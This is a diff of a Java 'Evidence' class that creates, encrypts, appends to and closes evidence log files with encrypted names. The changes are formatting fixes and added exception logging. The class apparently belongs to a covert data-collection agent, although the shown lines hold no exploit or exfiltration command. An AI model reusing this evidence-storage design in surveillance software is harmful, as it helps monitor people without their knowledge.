@@ -145,7 +145,7 @@ public final class Evidence {
 				firstSpace = false;
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " FATAL: not enough space. Free : " + free) ;//$NON-NLS-1$
+					Check.log(TAG + " FATAL: not enough space. Free : " + free);//$NON-NLS-1$
 				}
 			}
 			return false;
@@ -165,18 +165,18 @@ public final class Evidence {
 	 */
 	public synchronized boolean close() {
 		boolean ret = false;
-		
+
 		if (fconn != null && fconn.exists()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (close): " + EvidenceCollector.decryptName(fconn.getFilename()));
 			}
 			ret = fconn.dropExtension(EvidenceCollector.LOG_TMP);
-			if(!ret){
+			if (!ret) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " ERROR (close): cannot dropExtension" );
+					Check.log(TAG + " ERROR (close): cannot dropExtension");
 				}
 			}
-		}else{
+		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (close): fconn == null || !fconn.exists()");
 			}
@@ -232,7 +232,7 @@ public final class Evidence {
 		enoughSpace = enoughSpace();
 		if (!enoughSpace) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " createEvidence, no space") ;//$NON-NLS-1$
+				Check.log(TAG + " createEvidence, no space");//$NON-NLS-1$
 			}
 			return false;
 		}
@@ -246,7 +246,7 @@ public final class Evidence {
 
 		if (!ret) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: Dir not created: " + dir) ;//$NON-NLS-1$
+				Check.log(TAG + " Error: Dir not created: " + dir);//$NON-NLS-1$
 			}
 			return false;
 		}
@@ -266,12 +266,12 @@ public final class Evidence {
 			if (fconn.exists()) {
 				close();
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " FATAL: It should not exist:" + fileName) ;//$NON-NLS-1$
+					Check.log(TAG + " FATAL: It should not exist:" + fileName);//$NON-NLS-1$
 				}
 				return false;
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Created " + evidenceType + " : " + name.fileName) ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Created " + evidenceType + " : " + name.fileName);//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			final byte[] plainBuffer = makeDescription(additionalData, evidenceType);
 			if (Cfg.DEBUG) {
@@ -296,8 +296,12 @@ public final class Evidence {
 				// encBuffer.length);
 			}
 		} catch (final Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: file: " + name.fileName + " ex:" + ex) ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Error: file: " + name.fileName + " ex:" + ex);//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			return false;
 		}
@@ -392,7 +396,7 @@ public final class Evidence {
 
 		if (fconn == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: fconn null") ;//$NON-NLS-1$
+				Check.log(TAG + " Error: fconn null");//$NON-NLS-1$
 			}
 			return false;
 		}
@@ -402,8 +406,12 @@ public final class Evidence {
 			fconn.append(encData);
 			fconn.flush();
 		} catch (final Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: Error writing file: " + e) ;//$NON-NLS-1$
+				Check.log(TAG + " Error: Error writing file: " + e);//$NON-NLS-1$
 			}
 			return false;
 		}
@@ -456,14 +464,18 @@ public final class Evidence {
 		try {
 			// atomic info
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + message) ;//$NON-NLS-1$
+				Check.log(TAG + " Info: " + message);//$NON-NLS-1$
 			}
 
 			new LogR(EvidenceType.INFO, LogR.LOG_PRI_STD, null, WChar.getBytes(message, true));
 
 		} catch (final Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + ex.toString()) ;//$NON-NLS-1$
+				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
 			}
 		}
 	}
@@ -487,9 +499,9 @@ public final class Evidence {
 			close();
 		}
 	}
-	
+
 	@Override
-	public String toString(){
+	public String toString() {
 		return "Evidence " + progressive;
 	}
 }
